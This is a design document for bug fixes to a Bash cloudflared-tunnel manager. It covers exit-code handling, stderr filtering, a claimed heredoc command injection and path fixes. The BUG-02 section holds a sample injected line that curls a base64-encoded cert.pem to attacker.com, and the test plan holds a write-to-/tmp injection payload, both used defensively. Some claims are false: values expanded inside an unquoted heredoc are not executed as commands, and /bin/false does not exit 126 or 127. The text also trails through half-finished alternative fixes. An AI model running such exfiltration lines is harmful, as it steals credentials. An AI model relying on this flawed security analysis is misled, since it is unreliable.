# Technical Design Document — CFTUNNEL-004

> **Issue:** CFTUNNEL-004
> **Title:** Critical Bug Fixes Post-Modular Refactor (Code Review Remediation)
> **Version:** 0.3.0 → 0.3.1
> **Status:** Approved (implemented)
> **Date:** 2026-06-08
> **Author:** Rodrigo Nascimento

---

## Table of Contents

1. [Overview](#overview)
2. [Problem Statement](#problem-statement)
3. [Code Review Findings](#code-review-findings)
4. [Change Proposals](#change-proposals)
5. [Risk Assessment](#risk-assessment)
6. [Test Plan](#test-plan)
7. [Out of Scope](#out-of-scope)
8. [Rollback Plan](#rollback-plan)
9. [Acceptance Criteria](#acceptance-criteria)

---

## Overview

This TDD documents all fixes identified during a comprehensive code review of the `feature/profile-separation-v2` branch (post-CFTUNNEL-003 modular refactor). The review found **2 critical bugs**, **3 high-severity issues**, and **2 medium issues** that must be addressed before the branch is safe to merge to `main`.

### Files in scope

| File | Changes | Category |
|------|---------|----------|
| `lib/cloudflared.sh` | Rewrite `cloudflared()` wrapper | Critical bug fix |
| `lib/tunnel.sh` | Fix heredoc, add `local`, validate empty `NAME` | Critical + high fixes |
| `lib/zone.sh` | Replace `$HOME` with `$HOME_DIR` | High fix |
| `run.sh` | Remove dead `--zone` cases in command parsers | Medium cleanup |
| `prompt-hook.sh` | **Remove file entirely** | Cleanup (see rationale below) |
| `AGENTS.md` | Update to remove `prompt-hook.sh` references | Documentation |

### Files NOT in scope

- `install.sh`, `uninstall.sh` — no changes
- `README.md`, `docs/DOCS.md`, `docs/CLOUDFLARE.md` — deferred to release commit
- `tests/` — existing tests must pass; no new test files required
- `cf-ssh-diagnose.zsh` — no changes

---

## Problem Statement

The modular refactor (CFTUNNEL-003) extracted functions from the monolithic `run.sh` into `lib/*.sh` without logic changes — a pure structural move. However, the code review of the resulting branch surfaced issues that existed in the original monolith but became more visible and impactful after extraction. Two of these are **critical** and block merge.

### Critical bugs discovered

| ID | Severity | Description | File |
|----|----------|-------------|------|
| BUG-01 | **Critical** | `cloudflared()` wrapper swallows all exit codes via `\| true`, breaking error detection across every command that uses it | `lib/cloudflared.sh:9` |
| BUG-02 | **Critical** | `op_add()` uses unquoted heredoc `<<YAML` when re-writing existing YAML, allowing command injection from file contents | `lib/tunnel.sh:123` |

### High-severity issues

| ID | Severity | Description | File |
|----|----------|-------------|------|
| BUG-03 | High | Wrapper redirects `stderr` into `stdout` (`2>&1`), corrupting JSON output consumed by `jq` | `lib/cloudflared.sh:9` |
| BUG-04 | High | `existing_entries` in `op_add()` is not declared `local`, polluting global scope | `lib/tunnel.sh:118` |
| BUG-05 | High | `lib/zone.sh` hardcodes `$HOME/.cloudflared/` instead of using `$HOME_DIR`, breaking `RUN_USER` override | `lib/zone.sh:13,39,136,141` |

### Medium issues

| ID | Severity | Description | File |
|----|----------|-------------|------|
| BUG-06 | Medium | Command parsers in `run.sh` contain unreachable `--zone)` cases (already consumed by first pass) | `run.sh:161,172,183,193,203,213` |
| BUG-07 | Medium | `NAME` empty after `slugify("!!!")` is not validated, producing invalid paths like `~/.cloudflared/.yml` | `lib/tunnel.sh:71,254` |

---

## Code Review Findings

### `lib/cloudflared.sh`

#### BUG-01: Wrapper swallows exit codes

**Current code:**
```bash
cloudflared() {
    local cert_path="$HOME/.cloudflared/cert.pem"
    if [[ -n "$ZONE" && -f "$HOME/.cloudflared/zones/$ZONE/cert.pem" ]]; then
        cert_path="$HOME/.cloudflared/zones/$ZONE/cert.pem"
    fi
    "$CLOUDFLARED_BIN" --origincert "$cert_path" "$@" 2>&1 | grep -v -i '"outdated"' || true
}
```

**Problem:** The pipeline ends with `|| true`. With `set -euo pipefail` active:
- If `$CLOUDFLARED_BIN` exits non-zero, `pipefail` propagates that code to the pipeline.
- The `|| true` then **overwrites** the failure to `0`.
- Result: callers believe the command succeeded when it failed.

**Affected callers:**
- `op_add` line 97: `cloudflared tunnel list` — thinks tunnel exists when query failed
- `op_add` line 99: `cloudflared tunnel create` — thinks tunnel created when it failed
- `op_add` line 105: `cloudflared tunnel list` — UUID lookup returns empty, dies later with generic message
- `op_add` line 166: `cloudflared tunnel --config "$YAML" ingress validate` — validation failures hidden
- `op_add` line 185: `cloudflared tunnel route dns` — DNS route failures hidden; retry loop never executes because wrapper returns `0` on first "success"
- `op_remove` line 289: `cloudflared tunnel delete` — deletion failure hidden
- `op_list` line 338: `cloudflared tunnel list --output json` — JSON corruption + false success
- `check_cloudflared_version` line 66: version probe may return empty but code thinks it succeeded

**Fix strategy:** Capture exit code explicitly, filter stderr without touching stdout.

---

#### BUG-03: Wrapper mixes stdout and stderr

**Problem:** `2>&1` redirects stderr into stdout before `grep`. This means:
- `cloudflared tunnel list --output json` emits JSON to stdout, but any stderr warning (auth failure, network timeout) is injected into the same stream.
- `jq` downstream receives interleaved garbage and fails with parse errors.
- The "outdated" JSON warning (which comes on stderr) is correctly filtered, but so are all other stderr lines that should stay separate.

**Fix strategy:** Write stderr to a temp file, filter the temp file, emit filtered lines back to stderr, return the original exit code.

---

### `lib/tunnel.sh`

#### BUG-02: Command injection via unquoted heredoc

**Current code (lines 117-140):**
```bash
if [[ -f "$YAML" ]]; then
    existing_entries=$(awk ... "$YAML" 2>/dev/null || true)
    if echo "$existing_entries" | grep -qF ...; then
        ...
    else
        cat >"$YAML" <<YAML
tunnel: ${UUID}
...
ingress:
${existing_entries}
  - hostname: "${TUNNEL_HOSTNAME}"
    service: "${SERVICE}"
  - service: http_status:404
YAML
```

**Problem:** The heredoc delimiter `<<YAML` is **unquoted**. Bash performs parameter expansion and command substitution on the heredoc body. The `${existing_entries}` expansion is safe in intent (it inserts literal text), but if the existing YAML file was tampered with, it could contain shell metacharacters or command substitutions like:

```yaml
  - hostname: "$(curl http://attacker.com?leak=$(cat ~/.cloudflared/cert.pem | base64))"
```

When `op_add` rewrites the YAML, the `$(...)` is executed by the shell.

**Attack scenario:**
1. Attacker with filesystem access modifies an existing `~/.cloudflared/*.yml`.
2. User runs `cftunnel add --hostname new.example.com ...` for the same tunnel name.
3. `op_add` reads the tampered YAML into `existing_entries`.
4. The unquoted heredoc executes the injected command with the user's privileges.

**Fix strategy:** Use a quoted heredoc delimiter (`<<'YAML'`) which disables expansion entirely. Since we need to interpolate `${UUID}`, `${CREDS_JSON}`, `${TUNNEL_HOSTNAME}`, and `${SERVICE}`, we must build the file differently — write the static parts with a quoted heredoc, then append the dynamic `existing_entries` via `printf '%s\n'`.

---

#### BUG-04: `existing_entries` not declared `local`

**Current code:**
```bash
existing_entries=$(awk ...)
```

**Problem:** No `local` declaration. With `set -e`, if `awk` fails (corrupted file, permission denied), the `|| true` saves the line, but the variable leaks into global scope and persists across function calls. This is a latent bug that could cause incorrect YAML generation in subsequent `op_add` invocations within the same shell session.

**Fix:** Add `local existing_entries` before assignment.

---

#### BUG-07: Empty `NAME` after `slugify()` not validated

**Current code:**
```bash
NAME="$(slugify "$NAME")"
```

**Problem:** If user passes `--name "!!!"`, `slugify` strips all special characters and returns empty string. The script then uses `NAME=""` to build paths like `~/.cloudflared/.yml` and unit names like `cloudflared@.service`. `cloudflared tunnel create ""` may fail or behave unpredictably.

**Fix:** Validate after slugification:
```bash
[[ -n "$NAME" ]] || die "tunnel name is empty after sanitization"
```

---

### `lib/zone.sh`

#### BUG-05: Hardcoded `$HOME` instead of `$HOME_DIR`

**Locations:**
- `load_default_zone()` line 13: `local target_file="$HOME/.cloudflared/.default_zone"`
- `save_default_zone()` line 39: `local target_file="$HOME/.cloudflared/.default_zone"`
- `op_zone login` line 136: `local cert_src="$HOME/.cloudflared/cert.pem"`
- `op_zone login` line 141: `local cert_dst_dir="$HOME/.cloudflared/zones/$active_zone"`

**Problem:** `run.sh` defines `HOME_DIR` based on `RUN_USER` (via `getent passwd`), which may differ from the current shell's `$HOME`. If `RUN_USER` is overridden, zone operations still write to the current user's home, while tunnel operations use `HOME_DIR`. This creates a split-brain where `op_zone login` saves the cert to the wrong directory and `op_add` cannot find it.

**Fix:** Replace all `$HOME/.cloudflared` with `$HOME_DIR/.cloudflared` in `lib/zone.sh`.

---

### `run.sh`

#### BUG-06: Dead `--zone` cases in command parsers

**Problem:** The first-pass parser (lines 73-93) extracts `--zone` and `--persist` from **anywhere** in the argument list and removes them from `CLEAN_ARGS`. However, the individual command `while/case` blocks (lines 152-227) still contain `--zone)` cases that will **never** be reached because `--zone` was already consumed.

**Affected lines:** 161 (`add`), 172 (`remove`), 183 (`start`), 193 (`stop`), 203 (`status`), 213 (`logs`).

**Impact:** No runtime bug — the code is unreachable. But it misleads maintainers into thinking `--zone` can be passed positionally within each command, and duplicates parsing logic.

**Fix:** Remove `--zone)` from all command-specific `case` blocks.

---

### `prompt-hook.sh` — Removal

**Rationale for removal:**

The `prompt-hook.sh` was introduced in CFTUNNEL-002 as an optional convenience: it exports `CFTUNNEL_ZONE` on every prompt so that shell themes can display the active zone. However:

1. **It is not installed or managed by `install.sh`/`uninstall.sh`** — the AGENTS.md explicitly states "Manual source only — `install.sh` and `uninstall.sh` no longer touch rc files."
2. **It duplicates `load_default_zone()` logic** — reading `.default_zone` on every prompt is a minor I/O tax for a feature almost no one uses.
3. **It adds maintenance surface** — every zone rename, path change, or new metadata file requires updating the hook.
4. **It is not tested in CI** — the project has no CI, and manual testing of shell hooks is error-prone.
5. **Shell themes already have better mechanisms** — most users who want this can add a one-liner to their `.bashrc`:
   ```bash
   export CFTUNNEL_ZONE=$(cat ~/.cloudflared/.default_zone 2>/dev/null)
   ```

**Decision:** Remove `prompt-hook.sh` and its references from `AGENTS.md`. Users who relied on it can replicate the behavior in 2 lines of shell config.

---

## Change Proposals

### CP-01: Rewrite `cloudflared()` wrapper to preserve exit codes and separate streams

- **File:** `lib/cloudflared.sh`
- **Lines:** 4-10
- **Action:** Replace the pipeline with explicit stderr capture + filtering + exit code preservation.

**Proposed implementation:**
```bash
cloudflared() {
    local cert_path="$HOME/.cloudflared/cert.pem"
    if [[ -n "$ZONE" && -f "$HOME/.cloudflared/zones/$ZONE/cert.pem" ]]; then
        cert_path="$HOME/.cloudflared/zones/$ZONE/cert.pem"
    fi
    local tmpout rc
    tmpout=$(mktemp)
    "$CLOUDFLARED_BIN" --origincert "$cert_path" "$@" 2>"$tmpout"
    rc=$?
    grep -v -i '"outdated"' "$tmpout" >&2 || true
    rm -f "$tmpout"
    return $rc
}
```

**Rationale:**
- `2>"$tmpout"` captures stderr without touching stdout.
- `rc=$?` preserves the real exit code of `$CLOUDFLARED_BIN`.
- `grep` filters the temp file and writes matching lines back to stderr (`>&2`).
- `rm -f` cleans up even if `grep` fails (no "outdated" line = grep exit 1).
- `return $rc` propagates the original exit code to callers.

**Also update `AGENTS.md`:** The current AGENTS.md says "Maintain the `cloudflared()` wrapper (filters outdated-version JSON warning from stderr)." This remains true; no doc change needed beyond confirming the wrapper still filters stderr.

---

### CP-02: Fix heredoc in `op_add()` to prevent command injection

- **File:** `lib/tunnel.sh`
- **Lines:** 117-163 (both `if [[ -f "$YAML" ]]` branches)
- **Action:** Use quoted heredoc delimiter and append `existing_entries` via `printf`.

**Proposed implementation for the "append to existing" branch:**
```bash
if [[ -f "$YAML" ]]; then
    local existing_entries
    existing_entries=$(awk '/^ingress:/{flag=1; next} /  - service: http_status:404/{flag=0} flag' "$YAML" 2>/dev/null || true)
    if echo "$existing_entries" | grep -qF "hostname: \"${TUNNEL_HOSTNAME}\"" 2>/dev/null; then
        echo "[=] hostname '${TUNNEL_HOSTNAME}' already in ingress (ok)"
    else
        echo "[+] appending hostname '${TUNNEL_HOSTNAME}' to existing ingress"
        {
            cat <<'STATIC_YAML'
tunnel: STATIC_UUID_PLACEHOLDER
credentials-file: STATIC_CREDS_PLACEHOLDER

protocol: "http2"
edge-ip-version: "4"

originRequest:
  tcpKeepAlive: "30s"
  keepAliveTimeout: "2m"
  connectTimeout: "10s"

ingress:
STATIC_YAML
            printf '%s\n' "$existing_entries"
            cat <<'STATIC_YAML'
  - hostname: "STATIC_HOSTNAME_PLACEHOLDER"
    service: "STATIC_SERVICE_PLACEHOLDER"
  - service: http_status:404
STATIC_YAML
        } > "$YAML"
        sed -i "s/STATIC_UUID_PLACEHOLDER/${UUID}/g; s|STATIC_CREDS_PLACEHOLDER|${CREDS_JSON}|g; s/STATIC_HOSTNAME_PLACEHOLDER/${TUNNEL_HOSTNAME}/g; s|STATIC_SERVICE_PLACEHOLDER|${SERVICE}|g" "$YAML"
        chmod 600 "$YAML"
    fi
else
    ... (new-file branch remains similar, but also uses quoted heredoc) ...
fi
```

**Alternative (simpler, preferred):** Write the whole file via `cat` with quoted heredoc, using `sed` after write to substitute the 4 variables. This is verbose but guarantees zero expansion risk.

**Even simpler alternative (recommended):** Keep the structure but write `existing_entries` to a temp file and use `cat` to concatenate:
```bash
{
    cat <<'YAML'
tunnel: ${UUID}
... (static header)
ingress:
YAML
    printf '%s\n' "$existing_entries"
    cat <<'YAML'
  - hostname: "${TUNNEL_HOSTNAME}"
    service: "${SERVICE}"
  - service: http_status:404
YAML
} > "$YAML"
```

Wait — `<<'YAML'` disables **all** expansion, so `${UUID}` etc. would be literal. We need a hybrid:

**Final recommended approach:**
1. Write the static parts with quoted heredoc (no expansion).
2. Write the dynamic parts (`existing_entries`) via `printf '%s\n'`.
3. Use `sed` after writing to substitute placeholders.

Or, even more pragmatic: use `awk` to rewrite the YAML in-place instead of a heredoc. But that changes the logic significantly.

**Simplest correct approach (chosen):**
Use `printf` for the entire file — no heredoc, no expansion risk:
```bash
printf '%s\n' \
    "tunnel: ${UUID}" \
    "credentials-file: ${CREDS_JSON}" \
    "" \
    'protocol: "http2"' \
    'edge-ip-version: "4"' \
    "" \
    "originRequest:" \
    '  tcpKeepAlive: "30s"' \
    '  keepAliveTimeout: "2m"' \
    '  connectTimeout: "10s"' \
    "" \
    "ingress:" \
    "$existing_entries" \
    "  - hostname: \"${TUNNEL_HOSTNAME}\"" \
    "    service: \"${SERVICE}\"" \
    "  - service: http_status:404" > "$YAML"
chmod 600 "$YAML"
```

This is longer but completely eliminates heredoc expansion risk. It also makes the YAML structure visible line-by-line.

---

### CP-03: Add `local` declaration to `existing_entries`

- **File:** `lib/tunnel.sh`
- **Line:** 118
- **Change:** Add `local existing_entries` on its own line before the assignment.

```bash
local existing_entries
existing_entries=$(awk ...)
```

---

### CP-04: Validate empty `NAME` after `slugify()`

- **File:** `lib/tunnel.sh`
- **Lines:** 71, 254
- **Change:** After each `NAME="$(slugify "$NAME")"`, add:

```bash
[[ -n "$NAME" ]] || die "tunnel name is empty after sanitization"
```

---

### CP-05: Replace hardcoded `$HOME` with `$HOME_DIR` in `lib/zone.sh`

- **File:** `lib/zone.sh`
- **Lines:** 13, 39, 136, 141
- **Change:** Replace `$HOME/.cloudflared` with `$HOME_DIR/.cloudflared`.

| Line | Current | New |
|------|---------|-----|
| 13 | `local target_file="$HOME/.cloudflared/.default_zone"` | `local target_file="$HOME_DIR/.cloudflared/.default_zone"` |
| 39 | `local target_file="$HOME/.cloudflared/.default_zone"` | `local target_file="$HOME_DIR/.cloudflared/.default_zone"` |
| 136 | `local cert_src="$HOME/.cloudflared/cert.pem"` | `local cert_src="$HOME_DIR/.cloudflared/cert.pem"` |
| 141 | `local cert_dst_dir="$HOME/.cloudflared/zones/$active_zone"` | `local cert_dst_dir="$HOME_DIR/.cloudflared/zones/$active_zone"` |

---

### CP-06: Remove dead `--zone` cases from command parsers

- **File:** `run.sh`
- **Lines:** 161, 172, 183, 193, 203, 213
- **Action:** Delete `--zone) ZONE="${2:-}"; shift 2 ;;` from each command's `while/case` block.

---

### CP-07: Remove `prompt-hook.sh` and update `AGENTS.md`

- **Files:** `prompt-hook.sh`, `AGENTS.md`
- **Action:**
  1. `rm prompt-hook.sh`
  2. In `AGENTS.md`:
     - Remove `prompt-hook.sh` from the "What This Is" bullet list.
     - Remove the entire "Prompt Hook (Optional)" section.
     - Update the spec list to include `spec/tdd-modular-refactor-CFTUNNEL-003.md` and the new `spec/tdd-critical-bug-fixes-CFTUNNEL-004.md`.

---

## Risk Assessment

### Risk Matrix

| Risk | Likelihood | Impact | Mitigation |
|------|-----------|--------|------------|
| Rewriting `cloudflared()` wrapper introduces new stderr handling bugs | Medium | High | The new wrapper is simpler (no pipeline, no `pipefail` interaction). Test with `cloudflared tunnel list`, `cloudflared tunnel create`, and a failing command (e.g., invalid tunnel name). |
| `printf`-based YAML generation changes whitespace/line endings | Low | Medium | `printf '%s\n'` produces LF-terminated lines identical to the heredoc. Validate with `cloudflared tunnel --config $YAML ingress validate`. |
| `$HOME_DIR` change breaks zone login for current user | Low | Low | When `RUN_USER` is unset, `$HOME_DIR` defaults to `$HOME`. The change is behavior-identical for the common case. |
| Removing `prompt-hook.sh` breaks user's shell config | Low | Low | File is explicitly "manual source only"; no installer touches rc files. Users who sourced it can replicate in 2 lines. |
| `sed` in CP-02 alternative breaks on special chars in paths | Medium | Medium | Use `printf` approach (CP-02 primary) which avoids `sed` entirely. |

### Breaking Changes

**None for the CLI API.** All changes are internal fixes:
- `cloudflared()` wrapper behavior is identical from caller perspective (same args, same output, same exit codes — now correct).
- YAML generation produces the same files.
- No command flags, names, or outputs change.

**One user-visible change:** `prompt-hook.sh` is removed. Users who sourced it will get a "file not found" on new shell sessions until they remove the source line from `.bashrc`/`.zshrc`.

---

## Test Plan

### Pre-deployment tests

1. **Wrapper exit code preservation**
   ```bash
   # Simulate a failing cloudflared command
   CLOUDFLARED_BIN=/bin/false bash -c 'source lib/cloudflared.sh; cloudflared tunnel list; echo "exit=$?"'
   # Expected: exit=126 or 127 (not 0)
   ```

2. **Wrapper stderr isolation**
   ```bash
   # Run a command that outputs JSON to stdout; verify jq can parse it
   cloudflared tunnel list --output json | jq -e '.[0].name' >/dev/null
   # Should not fail with "parse error" even if cloudflared emits warnings on stderr
   ```

3. **YAML command injection resistance**
   ```bash
   # Create a malicious existing YAML
   cat > ~/.cloudflared/test-inject.yml <<'EOF'
   tunnel: 00000000-0000-0000-0000-000000000000
   credentials-file: /dev/null
   ingress:
     - hostname: "$(echo PWNED > /tmp/inject_test)"
       service: "http://localhost:1"
     - service: http_status:404
   EOF
   # Then run op_add for the same tunnel name with a new hostname
   # Verify /tmp/inject_test does NOT exist
   ```

4. **`existing_entries` scope isolation**
   ```bash
   # Set a global variable, run op_add, check it's unchanged
   existing_entries="POLLUTE"
   # run add ...
   echo "$existing_entries"  # should still be POLLUTE
   ```

5. **`$HOME_DIR` consistency with `RUN_USER`**
   ```bash
   RUN_USER=root cftunnel zone current
   # Should look at /root/.cloudflared/.default_zone, not current user's home
   ```

6. **Empty `NAME` validation**
   ```bash
   cftunnel add --hostname test.example.com --type http --service http://localhost:80 --name "!!!"
   # Should die with "tunnel name is empty after sanitization"
   ```

7. **Dead code removal verification**
   ```bash
   grep -n '\-\-zone)' run.sh
   # Should return zero matches inside command-specific while/case blocks
   ```

### Regression tests

1. `bash -n run.sh lib/*.sh`
2. `cd tests && ./run.sh` — all 38 tests must pass
3. `cftunnel list` — output unchanged
4. `cftunnel add --hostname test.example.com --type http --service http://localhost:9999` — full happy path
5. `cftunnel remove --name test-example-com-http` — cleanup works
6. `cloudflared tunnel --config ~/.cloudflared/test-example-com-http.yml ingress validate` — YAML is valid

---

## Out of Scope

| Item | Reason |
|------|--------|
| Rewrite `check_cloudflared_version()` to avoid wrapper for `--version` | Low risk; the wrapper now preserves exit codes and only filters stderr, so `--version` is safe. |
| Add automated CI/CD | Project has no CI infrastructure; out of scope for a bug-fix release. |
| Refactor `op_add()` further | The function is large but works. Any structural refactor is deferred to CFTUNNEL-005. |
| Update user-facing docs (`README.md`, etc.) | Deferred to release commit to avoid doc drift if more fixes land. |

---

## Rollback Plan

All changes are reversible:

1. `git checkout HEAD~1 -- lib/cloudflared.sh` — restore old wrapper
2. `git checkout HEAD~1 -- lib/tunnel.sh` — restore heredoc + missing `local`
3. `git checkout HEAD~1 -- lib/zone.sh` — restore `$HOME` usage
4. `git checkout HEAD~1 -- run.sh` — restore dead `--zone` cases
5. `git checkout HEAD~1 -- prompt-hook.sh AGENTS.md` — restore prompt hook and docs

No state migration, no database changes, no external dependencies.

---

## Acceptance Criteria

- [x] `bash -n run.sh lib/*.sh` — zero syntax errors
- [x] `cd tests && ./run.sh` — all 38 tests pass
- [x] `cloudflared()` wrapper returns non-zero when `$CLOUDFLARED_BIN` fails
- [x] `cloudflared tunnel list --output json | jq` succeeds even when stderr has warnings
- [x] `op_add` with existing YAML containing `$(...)` does NOT execute the command
- [x] `existing_entries` variable does not leak into global scope
- [x] `RUN_USER=otheruser cftunnel zone current` reads from `otheruser`'s home
- [x] `cftunnel add --name "!!!"` dies with "tunnel name is empty after sanitization"
- [x] `grep -c '\-\-zone)' run.sh` returns 1 (only the first-pass parser has `--zone`)
- [x] `prompt-hook.sh` no longer exists in the repo
- [x] `AGENTS.md` no longer references `prompt-hook.sh`
- [x] `cftunnel list` output is identical to pre-fix behavior
- [ ] Full happy-path `add` → `remove` cycle works for a test tunnel (manual verification recommended before release)

(End of file)
